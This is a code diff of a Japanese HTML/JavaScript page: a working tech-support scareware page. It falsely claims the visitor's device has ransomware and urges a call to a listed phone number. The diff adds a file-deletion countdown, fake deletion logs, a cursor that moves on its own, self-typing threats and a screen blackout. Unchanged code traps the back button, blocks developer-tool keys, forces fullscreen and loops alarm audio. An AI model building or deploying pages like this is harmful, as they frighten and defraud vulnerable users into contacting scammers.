@@ -2,13 +2,13 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
-  <title>Warning Page (Separated Files)</title>
+  <title>Warning Page (All-in-One Demo)</title>
   <!-- CSSファイルをリンク -->
   <link rel="stylesheet" href="styles.css" />
 </head>
 <body oncontextmenu="return false;"> <!-- 右クリック禁止 -->
 
-  <!-- パトランプを表示する要素 -->
+  <!-- パトランプ -->
   <div class="patrol-lamp"></div>
 
   <!-- メイン表示部分 -->
@@ -17,49 +17,67 @@
     <p class="sub-text">
       ただちに <span class="phone-number">070-1371-8527</span> まで連絡してください。
     </p>
+    <!-- カウントダウンタイマー表示箇所 -->
+    <p class="countdown-text">
+      <span id="countdown">180</span> 秒以内に連絡がない場合、ファイルがすべて削除されます。
+    </p>
   </div>
 
-  <!-- 音声ファイルを2つ同時に挿入 -->
-  <!-- autoplay & loop で勝手に再生し続ける -->
-  <!-- 例：生ファイルに直接アクセスできるURLを使ってください -->
-  <audio id="alert-audio1" 
+  <!-- 偽カーソル表示用 -->
+  <img id="fakeCursor" src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/fake-cursor.png" alt="fakeCursor" />
+
+  <!-- 勝手に文字入力されるテキストボックス -->
+  <div class="fake-input-area">
+    <label>入力欄:</label>
+    <input type="text" id="fakeInput" />
+  </div>
+
+  <!-- ファイル削除ログを表示するコンソール風エリア -->
+  <div id="consoleLog" class="console-log"></div>
+
+  <!-- 画面暗転用オーバーレイ -->
+  <div id="darkOverlay" class="overlay"></div>
+
+  <!-- 音声ファイル2つ -->
+  <audio id="alert-audio1"
          src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio1.mp3"
          autoplay loop preload="auto">
   </audio>
-  <audio id="alert-audio2" 
+  <audio id="alert-audio2"
          src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio2.mp3"
          autoplay loop preload="auto">
   </audio>
 
-  <!-- JavaScript（ここではHTML内に記載） -->
+  <!-- JavaScript -->
   <script>
-    // ページ読込完了時にエラーポップアップを表示し、音声を事前ロードする
+    /**************************************************
+     * 0. ページ読み込み時の処理（アラート, 音声プリロードなど）
+     **************************************************/
     window.addEventListener('load', () => {
-      // ★ ここでエラーポップアップを出す
       alert("エラーが発生しました！\n\nお使いの端末はランサムウェアに感染しています。\n\nただちに 070-1371-8527 までご連絡ください。");
-
+      
       const audioEl1 = document.getElementById('alert-audio1');
       const audioEl2 = document.getElementById('alert-audio2');
       audioEl1.load(); 
       audioEl2.load();
     });
 
-    /*
+    /**************************************************
      * 1. 戻るボタン等の操作をできる限り妨害
-     */
+     **************************************************/
     history.pushState(null, null, location.href);
     window.onpopstate = function(event) {
       history.pushState(null, null, location.href);
       alert("戻る操作は許可されていません！");
     };
 
-    /*
-     * 2. キーボード操作やドラッグなどの制御
-     */
+    /**************************************************
+     * 2. 特定のキー操作やドラッグなどの制限
+     **************************************************/
     document.addEventListener('keydown', function(e) {
-      // F12 (開発者ツール), Ctrl+Shift+I/J/C など
+      // F12, Ctrl+Shift+I/J/C など
       if (
-        e.key === 'F12' || 
+        e.key === 'F12' ||
         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))
       ) {
         e.preventDefault();
@@ -67,14 +85,15 @@
       }
     });
     // テキスト選択、ドラッグ禁止
-    document.addEventListener('selectstart', function(e) {
-      e.preventDefault();
-    });
-    document.addEventListener('dragstart', function(e) {
-      e.preventDefault();
-    });
+    document.addEventListener('selectstart', (e) => e.preventDefault());
+    document.addEventListener('dragstart', (e) => e.preventDefault());
 
-    // 画面クリックでフルスクリーン化（閉じにくくする演出）
+    /**************************************************
+     * 3. ユーザーがクリックしたらフルスクリーン & 音声再生
+     **************************************************/
+    const audio1 = document.getElementById('alert-audio1');
+    const audio2 = document.getElementById('alert-audio2');
+
     function goFullscreen() {
       const el = document.documentElement;
       if (el.requestFullscreen) {
@@ -85,15 +104,12 @@
         el.msRequestFullscreen();
       }
     }
-    document.addEventListener('click', goFullscreen);
-
-    /*
-     * 3. ブラウザのAutoplayポリシー対策で、クリック時に再生を呼び出す
-     */
-    const audio1 = document.getElementById('alert-audio1');
-    const audio2 = document.getElementById('alert-audio2');
 
     document.addEventListener('click', () => {
+      // フルスクリーン
+      goFullscreen();
+
+      // 音声再生（Autoplayブロック回避）
       if (audio1.paused) {
         audio1.play().catch(err => console.log('Audio1再生ブロック:', err));
       }
@@ -101,6 +117,118 @@
         audio2.play().catch(err => console.log('Audio2再生ブロック:', err));
       }
     });
+
+    /**************************************************
+     * 4. カウントダウンタイマー（脅迫演出）
+     **************************************************/
+    let remainingTime = 180; // 3分
+    const countdownEl = document.getElementById('countdown');
+    const timerInterval = setInterval(() => {
+      remainingTime--;
+      countdownEl.textContent = remainingTime;
+      if (remainingTime <= 0) {
+        clearInterval(timerInterval);
+        alert("ファイルが削除されました…");
+        // 暗転やファイル削除ログ終了など、ここで何か追加演出もOK
+      }
+    }, 1000);
+
+    /**************************************************
+     * 5. 画面フリッカー演出
+     *    一定時間後に body にクラスを付与し、チカチカ
+     **************************************************/
+    setTimeout(() => {
+      document.body.classList.add('flicker-on');
+      // 5秒後にフリッカー解除 → さらに暗転へ誘導も可
+      setTimeout(() => {
+        document.body.classList.remove('flicker-on');
+      }, 5000);
+    }, 8000); // 8秒後にフリッカー開始
+
+    /**************************************************
+     * 6. 偽カーソルでマウスが勝手に動く演出
+     **************************************************/
+    const fakeCursor = document.getElementById('fakeCursor');
+    let mouseX = 0, mouseY = 0; // 実際のマウス座標（追跡用）
+
+    // 本物のカーソルを隠すのは CSS側で: body { cursor: none; }
+    document.addEventListener('mousemove', (e) => {
+      mouseX = e.pageX;
+      mouseY = e.pageY;
+    });
+
+    // 偽カーソルを追従させる（やや遅延・ふわふわ動かすなど演出してもOK）
+    function followRealMouse() {
+      // 簡単に追従する場合
+      fakeCursor.style.left = mouseX + 'px';
+      fakeCursor.style.top  = mouseY + 'px';
+    }
+    setInterval(followRealMouse, 30);
+
+    // 勝手にカーソルが飛ぶ演出
+    function randomMoveCursor() {
+      let x = Math.random() * window.innerWidth;
+      let y = Math.random() * window.innerHeight;
+      fakeCursor.style.left = x + 'px';
+      fakeCursor.style.top  = y + 'px';
+    }
+    // 10秒後から2秒ごとにランダム移動
+    setTimeout(() => {
+      setInterval(randomMoveCursor, 2000);
+    }, 10000);
+
+    /**************************************************
+     * 7. 勝手に文字入力される演出
+     **************************************************/
+    const textToType = "あなたのデータはすべて監視されています...";
+    let index = 0;
+    const fakeInput = document.getElementById('fakeInput');
+
+    function typeNextChar() {
+      if (index < textToType.length) {
+        fakeInput.value += textToType.charAt(index);
+        index++;
+        setTimeout(typeNextChar, 120);
+      }
+    }
+    // 12秒後にタイピング開始
+    setTimeout(typeNextChar, 12000);
+
+    /**************************************************
+     * 8. スクリーン全体に「削除ログ」を表示
+     **************************************************/
+    const fileNames = [
+      'C:\\Users\\User\\Documents\\機密データ.docx',
+      'C:\\Users\\User\\Desktop\\秘密フォルダ\\personal.xlsx',
+      'D:\\Projects\\SourceCode\\main.js',
+      'C:\\重要書類\\passwords.txt',
+      'C:\\重要書類\\契約書.pdf'
+      // ... 適宜増やす
+    ];
+    const consoleLogEl = document.getElementById('consoleLog');
+    let fileIndex = 0;
+
+    function simulateDeleteLog() {
+      if (fileIndex < fileNames.length) {
+        consoleLogEl.innerHTML += "Deleting " + fileNames[fileIndex] + " ...<br>";
+        fileIndex++;
+        setTimeout(simulateDeleteLog, 500);
+      } else {
+        consoleLogEl.innerHTML += "<br><strong>すべてのファイルを削除しました。</strong>";
+      }
+    }
+    // 15秒後に削除ログをスタート
+    setTimeout(simulateDeleteLog, 15000);
+
+    /**************************************************
+     * 9. 画面暗転（徐々に真っ暗にする）
+     **************************************************/
+    const darkOverlay = document.getElementById('darkOverlay');
+    setTimeout(() => {
+      darkOverlay.classList.add('show'); // CSSの transition で暗転
+    }, 30000); // 30秒後に暗転開始
+
   </script>
+
 </body>
 </html>
